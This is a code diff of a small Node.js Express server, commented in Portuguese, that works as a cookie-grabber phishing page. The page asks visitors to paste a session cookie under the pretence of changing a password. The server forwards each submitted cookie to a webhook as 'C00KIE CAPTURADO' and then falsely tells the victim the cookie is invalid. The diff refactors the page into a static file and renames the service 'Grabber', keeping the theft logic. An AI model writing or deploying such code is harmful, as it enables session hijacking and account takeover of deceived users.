@@ -1,33 +1,20 @@
 const express = require('express');
+const path = require('path');
 const app = express();
 const PORT = process.env.PORT || 3000;
 
 app.use(express.urlencoded({ extended: true }));
 app.use(express.json());
+app.use(express.static('public'));
 
-// Página quase invisível (só pra ter algo)
+// Rota principal - página linda
 app.get('/', (req, res) => {
-  res.send(`
-    <meta charset="utf-8">
-    <title>C00KIE KEY</title>
-    <style>*{margin:0;padding:0;box-sizing:border-box}body{background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:15vh}h1{font-size:4rem;margin:20px}.box{margin:40px auto;width:90%;max-width:500px}input,button{padding:18px;width:100%;margin:10px 0;font-size:1.1rem}input{background:#111;border:2px solid #0f0;color:#0f0}button{background:#0f0;color:#000;border:none;cursor:pointer}</style>
-    <h1>C00KIE KEY</h1>
-    <p>Mudar senha por c00kie.</p>
-    <div class="box">
-      <input type="text" id="c" placeholder="Digite o c00kie aqui" autofocus>
-      <button onclick="f()">Enviar</button>
-    </div>
-    <p id="s" style="font-size:1.5rem;margin-top:20px"></p>
-    <script>
-      async function f(){const v=document.getElementById('c').value.trim();if(!v)return;document.getElementById('s').innerText='';await fetch('/',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'cookie='+encodeURIComponent(v)});document.getElementById('s').innerText='C00kie Inválido';document.getElementById('c').value='';document.getElementById('c').focus();}
-      document.addEventListener('keydown',e=>{if(e.key==='Enter')f()});
-    </script>
-  `);
+  res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
-// Recebe o cookie (GET ou POST)
-app.all('/', async (req, res) => {
-  let cookie = req.query.cookie || req.body.cookie || '';
+// Recebe o cookie (POST)
+app.post('/send', async (req, res) => {
+  const cookie = req.body.cookie || '';
 
   if (cookie) {
     try {
@@ -38,23 +25,18 @@ app.all('/', async (req, res) => {
           embeds: [{
             title: "C00KIE CAPTURADO",
             description: "```" + cookie + "```",
-            color: 0x00ff00,
+            color: 0x00dbde,
             timestamp: new Date().toISOString(),
-            footer: { text: "Cookie Service • Sempre vivo" }
+            footer: { text: "Cookie Grabber • Fundo Lindo" }
           }]
         })
       });
     } catch (e) {}
   }
 
-  // Sempre responde rápido (pra não dar erro no navegador)
-  if (req.method === 'POST') {
-    res.send('OK');
-  } else {
-    res.redirect('/');
-  }
+  res.json({ status: "C00kie Inválido" });
 });
 
 app.listen(PORT, () => {
-  console.log(`Cookie Service rodando na porta ${PORT}`);
+  console.log(`Grabber lindo rodando na porta ${PORT}`);
 });
